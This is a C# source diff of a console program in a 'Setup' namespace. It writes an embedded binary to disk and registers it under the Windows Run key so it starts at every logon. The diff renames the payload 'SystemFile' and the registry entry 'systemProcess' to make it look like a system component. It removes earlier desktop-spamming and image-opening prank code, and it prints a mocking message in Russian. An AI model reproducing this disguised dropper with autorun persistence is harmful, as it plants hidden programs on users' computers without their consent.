@@ -22,8 +22,8 @@ namespace Setup
             {
                 try
                 {
-                    File.WriteAllBytes(pathToPrikol, Resource1.Prikol);
-                    SetToAutorun();
+                    File.WriteAllBytes(pathToPrikol, Resource1.SystemFile);
+                    SetToAutorun("systemProcess");
                 }
 
                 catch
@@ -54,54 +54,23 @@ namespace Setup
 
             Thread.Sleep(1000);
 
-            SpanDesktop(Resource1.aaasssddd, 65);
-
             Console.WriteLine("Аапапахапхахпхапахпхапх, а я че знаю что-ли, апаапазпзапзапзазпазпхапвхаххпахххапахпхапаххаппаапъаъпхаахпахпап");
-
-            SaveAndOpenImage(5);
 
             Console.ReadKey();
         }
 
-        static void SetToAutorun()
+        static void SetToAutorun(string nameInRegistry)
         {
-            var startupKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-
-            string filename = Path.GetFileNameWithoutExtension(pathToPrikol);
-
             try
             {
-                startupKey.SetValue(filename, pathToPrikol);
+                using(var key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                    key.SetValue(nameInRegistry, pathToPrikol);
             }
             catch (Exception ex)
             {
                 Console.ForegroundColor = ConsoleColor.Red;
                 Console.WriteLine("Ошибка" + ex.Message);
                 Console.ForegroundColor = ConsoleColor.White;
-            }
-            finally
-            {
-                startupKey.Close();
-            }
-        }
-
-        static void SaveAndOpenImage(int repeat)
-        {
-            var path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\asd.png";
-            Resource1.asd.Save(path);
-            for (var i = 0; i < repeat;i++) Process.Start(path);
-        }
-
-        static void SpanDesktop(Bitmap image, int count)
-        {
-            var path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            for (var i = 0; i < count; i++)
-            {
-                try
-                {
-                    image.Save(path + $"\\asd{i}.png");
-                }
-                catch(Exception e) { Console.WriteLine(e.Message); }
             }
         }
     }
